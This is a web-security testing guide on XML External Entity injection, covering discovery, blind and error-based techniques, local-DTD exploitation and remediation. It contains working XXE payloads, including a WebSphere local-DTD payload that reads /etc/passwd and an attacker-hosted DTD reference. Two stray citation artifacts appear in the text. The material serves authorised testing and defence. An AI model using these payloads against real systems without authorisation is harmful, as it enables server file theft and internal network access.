# XML External Entity Injection

XML External Entity Injection (XXE) occurs when an XML parser processes attacker-controlled XML containing external entity definitions in an unsafe configuration.

Depending on the parser and application, XXE can potentially result in:

```text
Local file disclosure
Server Side Request Forgery
Blind out of band interactions
Internal service access
Application errors containing sensitive information
Denial of service
```

XXE testing should begin by identifying where XML is accepted and determining how the XML parser behaves.

!!! warning "Authorised Security Testing"
    Perform XXE testing only against applications and systems for which you have explicit authorisation. File access, internal network requests and out of band interactions may cross security boundaries, so remain within the agreed assessment scope.

---

# XXE Mental Model

A useful model is:

```text
Attacker-Controlled XML
        ↓
Application
        ↓
XML Parser
        ↓
DTD Processing
        ↓
External Entity Resolution
        ↓
File / URL / External Resource
```

The important questions are:

```text
Does the application parse XML?

Are DTDs allowed?

Are external entities enabled?

Can the parser access local resources?

Can the parser make network requests?

Is entity content returned?

Can execution be observed out of band?
```

---

# XXE Testing Workflow

A structured XXE workflow can look like:

```text
Identify XML Input
       ↓
Establish Baseline
       ↓
Determine Parser Behaviour
       ↓
Test DTD Processing
       ↓
Test Entity Expansion
       ↓
Test External Entity Resolution
       ↓
Determine Visible or Blind XXE
       ↓
Test Controlled File Access
       ↓
Test Controlled OOB Interaction
       ↓
Investigate SSRF if Relevant
       ↓
Investigate Local DTD Technique if Relevant
       ↓
Determine Impact
       ↓
Collect Minimal Evidence
       ↓
Report
```

Start with the smallest possible test.

---

# Where to Look for XXE

Potential locations include:

```text
XML APIs
SOAP services
SAML
SVG uploads
XML file uploads
Document imports
Office document processing
RSS
Atom feeds
Configuration imports
Metadata imports
Legacy web services
XML-RPC
Mobile application APIs
Enterprise integrations
File conversion
PDF generation
Image processing
```

Do not assume an application does not process XML simply because normal requests use JSON.

---

# Content Types

Interesting content types include:

```text
application/xml
text/xml
application/soap+xml
image/svg+xml
application/xhtml+xml
```

You may encounter requests such as:

```http
POST /api/import HTTP/1.1
Host: target.example
Content-Type: application/xml
```

or:

```http
POST /soap HTTP/1.1
Host: target.example
Content-Type: text/xml
```

---

# Establish a Baseline

Start with valid XML.

Example:

```xml
<?xml version="1.0"?>
<message>
    <text>Hello</text>
</message>
```

Record:

```text
Status code
Response length
Response body
Response time
Parser errors
Application behaviour
```

Then introduce one change at a time.

---

# Determine Whether XML Is Parsed

Malformed XML can sometimes help identify XML parsing.

For example:

```xml
<message>
    <text>Hello
</message>
```

Potential indicators include:

```text
XML parser error
SAX error
DOM error
Malformed XML
Unexpected closing element
Invalid document
Parsing exception
```

Parser errors can sometimes reveal the underlying XML implementation.

---

# DTD Processing

A Document Type Definition can define the structure and entities used by an XML document.

Basic structure:

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
    <!ENTITY test "XXE-TEST">
]>
<message>&test;</message>
```

If the application returns:

```text
XXE-TEST
```

the parser expanded the internal entity.

This alone does not prove that external entities are supported, but it provides useful information about parser behaviour.

---

# Internal vs External Entities

An internal entity contains its value directly:

```xml
<!ENTITY test "Hello">
```

An external entity references another resource:

```xml
<!ENTITY test SYSTEM "file:///some/file">
```

or potentially:

```xml
<!ENTITY test SYSTEM "https://example.com/resource">
```

Whether external entities work depends on:

```text
Parser
Parser configuration
Application framework
Operating system
Network restrictions
Protocol handlers
```

---

# Basic File Disclosure Testing

A classic XXE scenario occurs when an external entity references a local file.

Conceptually:

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
    <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<message>&xxe;</message>
```

If the parser resolves the entity and includes its contents in the response, local file disclosure may be possible.

For Windows environments, a harmless test file could be something such as:

```text
C:\Windows\win.ini
```

The objective is to establish whether local file access is possible.

Avoid retrieving unnecessary sensitive files.

---

# Linux File Testing

Potential minimal validation targets include:

```text
/etc/hostname
/etc/os-release
```

Use the least sensitive file that demonstrates the vulnerability.

Avoid immediately retrieving:

```text
/etc/shadow
Application secrets
SSH keys
Cloud credentials
Database credentials
```

The goal is proof, not data collection.

---

# Windows File Testing

A common harmless Windows file for controlled validation is:

```text
C:\Windows\win.ini
```

Conceptually:

```xml
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
```

Parser and URI handling behaviour varies.

---

# XXE Through HTTP

External entities may reference HTTP resources.

Conceptually:

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
    <!ENTITY xxe SYSTEM "https://example.com/xxe-test">
]>
<message>&xxe;</message>
```

If the server makes the request, XXE can create SSRF-like behaviour.

---

# XXE to SSRF

XXE can sometimes cause the XML parser to make server-side network requests.

Flow:

```text
Attacker XML
     ↓
XML Parser
     ↓
External Entity
     ↓
HTTP Request
     ↓
Remote / Internal Service
```

This creates overlap with SSRF.

However, the root cause remains:

```text
Unsafe XML External Entity Resolution
```

rather than generic URL fetching.

---

# Blind XXE

Blind XXE occurs when external entities are processed but their content is not returned directly in the application's response.

Example:

```text
XML Request
    ↓
Parser
    ↓
External Entity
    ↓
Network Interaction

Application Response
    ↓
Generic Success
```

In this situation, out of band interaction detection can be useful.

---

# Blind XXE Workflow

```text
Identify XML Parser
       ↓
Create Controlled External Entity
       ↓
Reference Callback Domain
       ↓
Submit XML
       ↓
Application Processes XML
       ↓
Monitor Collaborator / Interactsh
       ↓
Interaction?
       ↓
Correlate
       ↓
Reproduce
```

---

# Burp Collaborator

Burp Collaborator is particularly useful for detecting blind XXE.

A conceptual test can reference a Collaborator domain:

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
    <!ENTITY xxe SYSTEM "https://YOUR-COLLABORATOR-DOMAIN/xxe">
]>
<message>&xxe;</message>
```

Then:

```text
Send Request
     ↓
Poll Collaborator
     ↓
DNS Interaction?
     ↓
HTTP Interaction?
```

A DNS interaction indicates that external entity processing may have caused name resolution.

An HTTP interaction provides stronger evidence that the parser attempted to retrieve the resource.

---

# Interactsh

Interactsh can also be used for blind XXE testing.

Project:

https://github.com/projectdiscovery/interactsh

Start the client:

```bash
interactsh-client
```

Then use the generated callback domain in a controlled external entity.

Example workflow:

```text
interactsh-client
       ↓
Unique Domain
       ↓
XML External Entity
       ↓
Submit Request
       ↓
Monitor Interaction
```

Use unique identifiers when testing multiple locations.

---

# External DTD

An external DTD can contain entity definitions outside the original XML document.

Conceptually:

```xml
<!DOCTYPE message [
    <!ENTITY % external SYSTEM "https://example.com/test.dtd">
    %external;
]>
```

The parser retrieves:

```text
test.dtd
```

and processes its contents.

This can be useful for blind XXE testing because external DTD syntax allows behaviours that may not be permitted directly inside the internal DTD subset.

---

# Error Based XXE

Some XXE vulnerabilities can disclose information through XML parser error messages.

The general idea is:

```text
File Content
     ↓
Included in Invalid Resource
     ↓
Parser Attempts Resolution
     ↓
Parser Error
     ↓
File Content Appears in Error
```

This becomes particularly interesting when:

```text
External entities work
```

but:

```text
Normal entity output is not returned
```

---

# External DTD Error Based Technique

A conceptual external DTD might contain:

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">

<!ENTITY % eval "
    <!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>
">

%eval;
%error;
```

The resulting parser error may contain the content of the referenced file.

Whether this works depends heavily on the XML parser.

---

# Internal DTD Restrictions

There is an important XML limitation when attempting some parameter entity techniques directly inside an internal DTD subset.

For example, placing an entity reference inside another entity declaration may result in an error similar to:

```text
The parameter entity reference cannot occur within markup
in the internal subset of the DTD.
```

External DTDs can permit constructs that are prohibited directly within the internal subset.

This creates an interesting problem when:

```text
External Entity Resolution Works
```

but:

```text
Outbound Network Access Is Blocked
```

One advanced technique is to use an existing DTD already present on the target system.

---

# XXE Using Local DTD Files

A particularly interesting blind and error-based XXE technique involves loading a DTD that already exists on the target server.

This technique was documented by Arseniy Sharoglazov in:

**Exploiting XXE with local DTD files**

https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/

The scenario is:

```text
XXE Exists
   ↓
External Entities Supported
   ↓
Normal Response Does Not Show File
   ↓
External DTD Would Normally Help
   ↓
Outbound Firewall Prevents External DTD
   ↓
Use Existing Local DTD
   ↓
Redefine Existing Parameter Entity
   ↓
Trigger Parser Error
   ↓
File Content May Appear
```

The technique takes advantage of an existing local DTD and redefines one of its parameter entities.

---

# Why Local DTDs Matter

Consider the normal external DTD approach:

```text
XML Parser
     ↓
https://attacker.example/ext.dtd
```

If outbound network access is blocked:

```text
XML Parser
     X
External DTD
```

But the server may already contain usable DTD files:

```text
XML Parser
     ↓
file:///local/path/example.dtd
```

This avoids requiring an externally hosted DTD.

The referenced research explains that external DTD syntax can permit entity nesting behaviour that is restricted in the internal subset. A local DTD can therefore provide the required parsing context.

---

# IBM WebSphere Local DTD Example

One example from the local DTD research targets a DTD present in IBM WebSphere:

```text
/opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd
```

The test XML is:

```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd">

    <!ENTITY % condition 'aaa)>
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">

        <!ENTITY &#x25; eval "
            <!ENTITY &#x26;#x25; error SYSTEM
            &#x27;file:///nonexistent/&#x25;file;&#x27;>
        ">

        &#x25;eval;
        &#x25;error;

        <!ELEMENT aa (bb'>

    %local_dtd;
]>

<message>any text</message>
```

This is the payload from the referenced local DTD research.

The technique targets an existing parameter entity named:

```text
condition
```

inside the WebSphere DTD.

The referenced DTD contains a declaration conceptually resembling:

```xml
<!ENTITY % condition "and | or | not | equal | contains | exists | subdomain-of">
```

The research explains that XML entities behave as constants in this context. By defining the same entity name before the local DTD is loaded, the attacker-controlled definition is used. :contentReference[oaicite:1]{index=1}

---

# Local DTD Technique Flow

The technique can be visualised as:

```text
Attacker XML
      ↓
Define local_dtd
      ↓
Redefine Existing Parameter Entity
      ↓
Load Existing Local DTD
      ↓
DTD References Redefined Entity
      ↓
Injected DTD Structure Processed
      ↓
Read Local File
      ↓
Construct Invalid File URI
      ↓
Trigger Parser Error
      ↓
File Content May Appear in Error
```

This is significantly more specialised than basic XXE.

It depends on:

```text
XXE being present
External entity processing being enabled
A suitable local DTD existing
Knowing or discovering the DTD path
Knowing a redefinable parameter entity
Compatible XML parser behaviour
Useful parser errors being returned
```

---

# Local DTD Testing Methodology

Do not begin with `/etc/passwd`.

A safer methodology is:

```text
Confirm XML Parsing
       ↓
Confirm DTD Processing
       ↓
Confirm External Entity Support
       ↓
Determine Outbound Network Behaviour
       ↓
Identify Application / Platform
       ↓
Identify Likely Local DTD
       ↓
Use Harmless Local File
       ↓
Test Entity Redefinition
       ↓
Observe Parser Error
       ↓
Confirm Repeatability
```

For example, substitute a less sensitive file such as:

```text
/etc/hostname
```

when demonstrating the technique.

---

# Finding Local DTD Files

The difficult part of this technique is finding a DTD that exists locally and contains a parameter entity that can be redefined.

Potential sources include:

```text
Operating system packages
Application servers
XML libraries
Documentation frameworks
Java libraries
Enterprise middleware
Installed applications
```

Technology identification therefore becomes particularly useful.

---

# Example Linux DTD Location

The referenced research gives an example involving:

```text
/usr/share/yelp/dtd/docbookx.dtd
```

with a parameter entity such as:

```text
ISOamsa
```

Conceptually:

```xml
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">

<!ENTITY % ISOamsa 'CUSTOM DTD CONTENT'>

%local_dtd;
```

The exact entity redefinition depends on the DTD.

---

# Example Windows DTD Location

The research also documents a Windows example:

```text
C:\Windows\System32\wbem\xml\cim20.dtd
```

Conceptually:

```xml
<!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">

<!ENTITY % SuperClass 'CUSTOM DTD CONTENT'>

%local_dtd;
```

This illustrates why local DTD XXE is not limited to Linux systems.

---

# Additional Local DTD Examples

The referenced research also discusses DTD locations associated with technologies such as:

```text
IBM WebSphere
Cisco WebEx
Citrix XenMobile
Linux documentation packages
Windows WBEM
Java application environments
```

Do not assume these paths exist.

They should be treated as technology-specific research references rather than universal payloads.

---

# Technology Identification for Local DTD XXE

Before trying local DTD paths, identify the environment.

Useful clues include:

```text
HTTP headers
Error messages
Cookies
Java package names
Stack traces
Application server headers
Known framework paths
Server banners
SOAP responses
SAML metadata
Dependency information
```

For example:

```text
WebSphere identified
       ↓
Investigate WebSphere DTDs
```

is much more targeted than trying hundreds of unrelated paths.

---

# XXE Through SVG

SVG is XML.

Example:

```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="20">Test</text>
</svg>
```

Applications that accept SVG files may parse them using XML libraries.

Potential flow:

```text
SVG Upload
    ↓
Backend Parser
    ↓
XML Processing
    ↓
External Entity Resolution
```

Therefore, SVG upload functionality can be relevant to XXE testing.

---

# SVG Upload Workflow

```text
Upload Normal SVG
      ↓
Confirm Processing
      ↓
Introduce Harmless XML Entity
      ↓
Determine DTD Handling
      ↓
Controlled External Entity
      ↓
Observe Response / Callback
```

Do not assume browser rendering is responsible.

The vulnerable component may be a backend image processor.

---

# XXE in SOAP

SOAP uses XML extensively.

Example:

```xml
<soap:Envelope
    xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">

    <soap:Body>
        <getUser>
            <id>123</id>
        </getUser>
    </soap:Body>

</soap:Envelope>
```

Potential workflow:

```text
SOAP Endpoint
     ↓
XML Parser
     ↓
DTD Processing?
     ↓
External Entity?
```

SOAP services should therefore always be considered during XXE testing.

---

# XXE in SAML

SAML messages are XML documents.

Potential processing occurs during:

```text
SAML authentication
Metadata import
Identity provider configuration
Service provider configuration
```

The XML parser used for SAML processing should have external entity resolution disabled.

Do not modify production authentication flows beyond what the assessment scope permits.

---

# XXE in Office Documents

Modern Office documents frequently contain XML internally.

Examples:

```text
DOCX
XLSX
PPTX
```

These formats are ZIP archives containing XML documents.

Potential processing flow:

```text
Office Document
      ↓
Upload
      ↓
Archive Extraction
      ↓
XML Parsing
```

Whether XXE is possible depends on the server-side processing library.

---

# XXE in XML File Uploads

Applications may allow users to upload:

```text
XML configuration
XML reports
XML invoices
XML exports
XML metadata
```

The upload itself may succeed normally.

The vulnerability occurs when the backend later parses the file.

This can also create asynchronous XXE.

---

# Asynchronous XXE

Some XML processing happens later:

```text
Upload XML
    ↓
Queue
    ↓
HTTP Response
    ↓
Background Worker
    ↓
XML Parser
    ↓
External Entity
```

In these situations:

```text
Burp Collaborator
```

or:

```text
Interactsh
```

can be particularly useful.

---

# XInclude

Some applications process XML but do not permit attacker-controlled `DOCTYPE` declarations.

XInclude is a separate XML mechanism that can sometimes cause external resources to be included.

Conceptually:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/hostname"/>
</foo>
```

Whether XInclude is processed depends on the XML parser and application configuration.

XXE and XInclude are related XML security issues but are not identical mechanisms.

---

# Content Type Switching

An endpoint may normally expect:

```text
application/x-www-form-urlencoded
```

or:

```text
application/json
```

but the backend framework may also accept XML.

A controlled test can determine whether:

```text
Content-Type: application/xml
```

is processed.

Do not assume that the visible client defines every format supported by the server.

---

# Burp Suite XXE Workflow

Burp Suite provides a practical manual workflow.

```text
Proxy
  ↓
HTTP History
  ↓
Identify XML Request
  ↓
Send to Repeater
  ↓
Establish Baseline
  ↓
Test DTD
  ↓
Test Internal Entity
  ↓
Test External Entity
  ↓
Collaborator if Blind
  ↓
Manual Verification
```

---

# Burp Repeater

Repeater should be the primary manual testing tool.

For each XML endpoint:

```text
1. Send valid XML

2. Record baseline

3. Introduce an internal entity

4. Determine whether entities expand

5. Test controlled external entity

6. Observe response

7. Check callback infrastructure

8. Reproduce

9. Determine minimal impact
```

Keep each change small and understandable.

---

# Burp Collaborator Workflow

For blind XXE:

```text
Repeater
   ↓
Create Collaborator Domain
   ↓
External Entity
   ↓
Send XML
   ↓
Poll Collaborator
   ↓
DNS / HTTP Interaction
   ↓
Correlate
   ↓
Reproduce
```

Use unique paths such as:

```text
/xxe-001
/xxe-002
/xxe-003
```

when testing multiple XML locations.

---

# Burp Intruder

Intruder can help test a controlled set of XML processing variations.

Potential variations include:

```text
Different entity locations
Different XML elements
Different content types
Different harmless local files
Different controlled callback domains
```

Avoid indiscriminately attempting large local file lists against production systems.

---

# Source Code Review

When source code is available, identify XML parsers and determine how they are configured.

The general flow is:

```text
SOURCE
  ↓
HTTP Body / Uploaded XML
  ↓
Parser Creation
  ↓
Parser Configuration
  ↓
XML Parsing
  ↓
External Entity Resolution
```

The key question is not merely:

```text
Does the application use XML?
```

but:

```text
How is the parser configured?
```

---

# Java XML Parsers

Interesting Java APIs include:

```text
DocumentBuilderFactory
SAXParserFactory
XMLInputFactory
TransformerFactory
SchemaFactory
SAXBuilder
SAXReader
```

Search for:

```java
DocumentBuilderFactory.newInstance()
```

Then inspect security features controlling:

```text
DOCTYPE
External general entities
External parameter entities
External DTD loading
```

---

# .NET XML Parsers

Interesting .NET APIs include:

```text
XmlDocument
XmlReader
XmlTextReader
XDocument
XPathDocument
```

Review:

```text
DtdProcessing
XmlResolver
```

Parser defaults vary across .NET versions.

---

# PHP XML Processing

Interesting PHP functionality includes:

```text
DOMDocument
SimpleXML
XMLReader
libxml
```

Example:

```php
$xml = new DOMDocument();
$xml->loadXML($input);
```

Review the parser configuration and runtime version rather than assuming default behaviour.

---

# Python XML Processing

Interesting Python modules include:

```text
xml.etree.ElementTree
xml.dom.minidom
xml.sax
lxml
```

When reviewing Python applications, determine:

```text
Which parser?
Which version?
Are external entities enabled?
Are DTDs loaded?
```

Libraries such as:

```text
defusedxml
```

can provide safer XML parsing for untrusted data.

---

# Node.js XML Processing

Node.js applications commonly rely on third-party XML packages.

Search for:

```text
xml2js
libxmljs
fast-xml-parser
xmldom
sax
```

Review the exact library and configuration.

---

# Ruby XML Processing

Interesting Ruby libraries include:

```text
Nokogiri
REXML
LibXML
```

Review DTD and external entity behaviour.

---

# Search Source Code for XML Parsers

A quick first pass:

```bash
grep -RniE \
'DocumentBuilderFactory|SAXParserFactory|XMLInputFactory|XmlDocument|XmlReader|XmlTextReader|DOMDocument|SimpleXML|XMLReader|ElementTree|lxml|xml2js|libxmljs|fast-xml-parser|Nokogiri|REXML' \
.
```

With ripgrep:

```bash
rg -n \
'DocumentBuilderFactory|SAXParserFactory|XMLInputFactory|XmlDocument|XmlReader|XmlTextReader|DOMDocument|SimpleXML|XMLReader|ElementTree|lxml|xml2js|libxmljs|fast-xml-parser|Nokogiri|REXML'
```

Then inspect how each parser is configured.

---

# Source to Sink Analysis

A useful model:

```text
SOURCE
  ↓
HTTP XML Body
  ↓
Controller
  ↓
XML Parser
  ↓
DTD Processing
  ↓
External Entity Resolver
  ↓
FILE / NETWORK RESOURCE
```

For example:

```text
request.body
    ↓
parseXml()
    ↓
DocumentBuilder
    ↓
External Entity Enabled
```

This provides stronger evidence than simply finding an XML parser dependency.

---

# XXE False Positives

Potential causes of misleading behaviour include:

```text
Client-side XML processing
Proxy-generated DNS
Security scanner interactions
Application URL preview functionality
Generic parser errors
Cached responses
Monitoring systems
Email security systems
```

Use unique identifiers and correlate timestamps.

---

# Validation

A strong XXE finding should establish:

```text
ATTACKER XML
      ↓
XML PARSER
      ↓
EXTERNAL ENTITY RESOLUTION
      ↓
FILE / NETWORK RESOURCE
      ↓
OBSERVABLE EVIDENCE
      ↓
SECURITY IMPACT
```

For blind XXE:

```text
XML
 ↓
Parser
 ↓
External Entity
 ↓
Controlled Domain
 ↓
DNS / HTTP Callback
```

---

# Evidence Collection

Useful evidence includes:

```text
Affected endpoint
HTTP method
Content-Type
Authentication requirement
Original XML
Modified XML
Parser error
Returned file content if applicable
Callback identifier
DNS interaction
HTTP interaction
Timestamp
XML parser if identifiable
Relevant screenshot
```

Use minimal file disclosure for proof.

---

# XXE Reporting

A report should explain:

```text
Where XML originates
Which endpoint parses it
Whether DTD processing is enabled
Whether external entities are resolved
Whether local files can be accessed
Whether server-side requests are possible
Whether XXE is blind
How the vulnerability was confirmed
What security impact exists
How it should be remediated
```

---

# Example Finding Structure

```text
Title
XML External Entity Injection in XML Import Function

Affected Endpoint
POST /api/import

Content Type
application/xml

Authentication Required
Yes

Description
The application parses attacker-controlled XML using a parser
configuration that permits external entity resolution.

Testing demonstrated that an external entity could reference a
local operating system file and its contents were returned in
the application response.

Impact
An attacker with access to the affected functionality may be
able to access files readable by the application process.

Depending on parser configuration and network access, the
vulnerability may also permit server-side requests to internal
or external services.

Recommendation
Disable DTD processing and external entity resolution for
untrusted XML. Use secure parser configuration and ensure the
application does not resolve external resources while processing
user-controlled XML.
```

---

# Remediation

The preferred defence is:

```text
Disable DTD Processing
        +
Disable External Entity Resolution
```

where the application does not require these features.

Additional controls include:

```text
Use secure parser defaults
Disable external general entities
Disable external parameter entities
Disable external DTD loading
Disable XInclude where unnecessary
Restrict outbound network access
Run applications with least privilege
Keep XML libraries updated
Validate uploaded XML
Avoid unnecessary XML parsing
```

---

# Network Controls

Even with secure XML parser configuration, network segmentation provides useful defence in depth.

Example:

```text
Application
     ↓
Egress Firewall
     ↓
Approved Services Only
```

A parser should not have unrestricted access to internal networks or the Internet unless required.

---

# File Permissions

XXE file disclosure is limited by the privileges of the application process.

Therefore:

```text
Least Privilege
```

remains important.

The application should not have unnecessary read access to:

```text
Credentials
Private keys
System configuration
Other users' data
Cloud secrets
Application secrets
```

---

# XXE Testing Checklist

## Discovery

- [ ] Identify XML endpoints
- [ ] Identify SOAP
- [ ] Identify SAML
- [ ] Identify SVG uploads
- [ ] Identify XML uploads
- [ ] Identify Office document processing
- [ ] Identify RSS / Atom
- [ ] Identify XML configuration imports
- [ ] Identify metadata imports
- [ ] Identify legacy APIs

## Baseline

- [ ] Send valid XML
- [ ] Record status
- [ ] Record response
- [ ] Record response time
- [ ] Identify parser errors
- [ ] Determine content type

## Parser Behaviour

- [ ] Test malformed XML
- [ ] Test internal entity
- [ ] Determine whether DTD is accepted
- [ ] Determine whether entity expansion occurs
- [ ] Test controlled external entity
- [ ] Determine whether external DTDs are loaded

## File Access

- [ ] Use harmless file first
- [ ] Linux: consider `/etc/hostname`
- [ ] Windows: consider `win.ini`
- [ ] Avoid unnecessary sensitive files
- [ ] Confirm repeatability

## Blind XXE

- [ ] Burp Collaborator
- [ ] Interactsh
- [ ] Unique callback identifier
- [ ] Check DNS interaction
- [ ] Check HTTP interaction
- [ ] Correlate timestamps
- [ ] Reproduce

## Error Based XXE

- [ ] Determine whether parser errors are returned
- [ ] Test controlled error generation
- [ ] Consider external DTD
- [ ] Consider local DTD if outbound access is blocked
- [ ] Use minimal file disclosure

## Local DTD

- [ ] Identify platform
- [ ] Identify application server
- [ ] Search for likely local DTDs
- [ ] Identify redefinable parameter entity
- [ ] Test harmless file
- [ ] Observe parser error
- [ ] Confirm repeatability
- [ ] Do not blindly enumerate large filesystem areas

## SSRF

- [ ] Determine whether HTTP external entities work
- [ ] Use controlled callback
- [ ] Determine whether redirects are followed
- [ ] Test internal services only if authorised
- [ ] Avoid broad internal scanning

## File Formats

- [ ] SVG
- [ ] XML
- [ ] SOAP
- [ ] SAML
- [ ] DOCX processing
- [ ] XLSX processing
- [ ] PPTX processing

## Burp

- [ ] Proxy
- [ ] HTTP History
- [ ] Repeater
- [ ] Collaborator
- [ ] Intruder where appropriate

## Source Review

- [ ] Search XML parser APIs
- [ ] Identify parser configuration
- [ ] Check DTD processing
- [ ] Check external entities
- [ ] Check external parameter entities
- [ ] Check external DTD loading
- [ ] Check XInclude
- [ ] Trace XML input to parser

## Validation

- [ ] Confirm server-side XML parsing
- [ ] Confirm entity processing
- [ ] Confirm external resource resolution
- [ ] Confirm repeatability
- [ ] Exclude unrelated callbacks
- [ ] Use minimal proof
- [ ] Capture evidence
- [ ] Stop after sufficient evidence

---

# Useful Tools

| Tool | Purpose |
|---|---|
| Burp Suite | XML request interception and testing |
| Burp Repeater | Manual XXE testing |
| Burp Collaborator | Blind and OOB XXE detection |
| Burp Intruder | Controlled XML variation testing |
| Interactsh | External interaction detection |
| curl | Manual XML requests |
| Browser DevTools | Application and API analysis |
| grep | XML parser source discovery |
| ripgrep | Fast source code searching |
| Semgrep | Structured source analysis |

---

# Tool Selection

| Situation | Tool |
|---|---|
| Understand XML request | Burp Proxy |
| Manual XXE | Burp Repeater |
| Blind XXE | Burp Collaborator |
| External callback | Interactsh |
| XML variations | Burp Intruder |
| Manual HTTP reproduction | curl |
| Source review | grep / ripgrep |
| Structured source analysis | Semgrep |

---

# Quick Reference

```text
Interesting Input:

XML
SOAP
SAML
SVG
XML uploads
RSS
Metadata
Office documents

Basic Flow:

XML
 ↓
DTD
 ↓
External Entity
 ↓
File / URL

Blind XXE:

XML
 ↓
External Entity
 ↓
Burp Collaborator / Interactsh

Advanced Error Based:

XML
 ↓
Local DTD
 ↓
Parameter Entity Redefinition
 ↓
Parser Error
 ↓
Controlled File Disclosure

Source Review:

Java      → DocumentBuilderFactory, SAXParserFactory, XMLInputFactory
.NET      → XmlDocument, XmlReader, XmlTextReader
PHP       → DOMDocument, SimpleXML, XMLReader
Python    → ElementTree, lxml, SAX
Node.js   → xml2js, libxmljs, fast-xml-parser
Ruby      → Nokogiri, REXML

Always establish:

XML INPUT → PARSER → ENTITY RESOLUTION → RESOURCE → EVIDENCE → IMPACT
```

---

# Practical Workflow Summary

```text
                  ┌─────────────────────┐
                  │ Identify XML Input  │
                  └──────────┬──────────┘
                             │
                             ▼
                  ┌─────────────────────┐
                  │ Establish Baseline  │
                  └──────────┬──────────┘
                             │
                             ▼
                  ┌─────────────────────┐
                  │ Test DTD Processing │
                  └──────────┬──────────┘
                             │
                             ▼
                  ┌─────────────────────┐
                  │ Entity Expansion?   │
                  └──────────┬──────────┘
                             │
                             ▼
                  ┌─────────────────────┐
                  │ External Entities?  │
                  └──────────┬──────────┘
                             │
                             ▼
              ┌──────────────┴──────────────┐
              │                             │
              ▼                             ▼
      ┌───────────────┐             ┌───────────────┐
      │ Visible XXE   │             │  Blind XXE    │
      └───────┬───────┘             └───────┬───────┘
              │                             │
              ▼                             ▼
      ┌───────────────┐          ┌────────────────────┐
      │ Minimal File  │          │ Collaborator /     │
      │ Validation    │          │ Interactsh         │
      └───────┬───────┘          └─────────┬──────────┘
              │                             │
              └──────────────┬──────────────┘
                             │
                             ▼
                  ┌─────────────────────┐
                  │ Local DTD if Needed │
                  └──────────┬──────────┘
                             │
                             ▼
                  ┌─────────────────────┐
                  │ Determine Impact    │
                  └──────────┬──────────┘
                             │
                             ▼
                  ┌─────────────────────┐
                  │ Minimal Evidence    │
                  └──────────┬──────────┘
                             │
                             ▼
                  ┌─────────────────────┐
                  │ Report              │
                  └─────────────────────┘
```

---

# References

## PortSwigger Web Security Academy

### XML External Entity Injection

https://portswigger.net/web-security/xxe

PortSwigger provides practical XXE material covering file retrieval, SSRF, blind XXE, out of band techniques and XInclude.

---

## PortSwigger XXE Labs

https://portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection

Useful practical labs for learning XML parser behaviour and XXE validation.

---

## OWASP

### XML External Entity Prevention Cheat Sheet

https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html

Provides parser-specific defensive guidance for preventing XXE.

---

## PayloadsAllTheThings

### XXE Injection

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

Useful reference covering XXE techniques, blind XXE, file disclosure and parser-specific behaviour.

---

## HackTricks

### XXE

https://book.hacktricks.wiki/en/pentesting-web/xxe-xee-xml-external-entity.html

Additional practical reference covering XML entity processing and XXE techniques.

---

## Local DTD XXE Research

### Exploiting XXE with Local DTD Files

Arseniy Sharoglazov:

https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/

This research demonstrates an advanced error-based XXE technique where an existing DTD on the target system is loaded and one of its parameter entities is redefined.

The technique is particularly useful to understand situations where:

```text
XXE exists
+
External entities work
+
Normal output is unavailable
+
Outbound access prevents external DTD retrieval
```

The research includes examples for environments including IBM WebSphere, Windows, Linux, Cisco WebEx and Citrix XenMobile. :contentReference[oaicite:2]{index=2}

---

## Interactsh

### ProjectDiscovery Interactsh

https://github.com/projectdiscovery/interactsh

Useful for detecting controlled DNS and HTTP interactions during blind XXE testing.

---

## Burp Collaborator

https://portswigger.net/burp/documentation/collaborator

Useful for detecting out of band interactions caused by XML external entity resolution.

---

# Related Notes

```text
Web Application Security
├── Methodology
├── Pentesting Checklist
├── Reconnaissance
│   ├── Subdomain Enumeration
│   ├── Technology Identification
│   ├── Content Discovery
│   ├── Parameter Discovery
│   └── JavaScript Analysis
├── Authentication
├── Authorisation
├── Session Management
├── Burp Suite
│   ├── Extensions
│   └── Testing Workflows
├── Cross-Site Scripting
├── SQL Injection
├── OS Command Injection
├── Server Side Request Forgery
└── XML External Entity Injection
```

The SSRF notes are particularly relevant because XXE external entities can produce server-side network interactions.

Technology identification is especially useful when investigating local DTD XXE because the available DTD files depend heavily on the operating system, middleware and installed software.
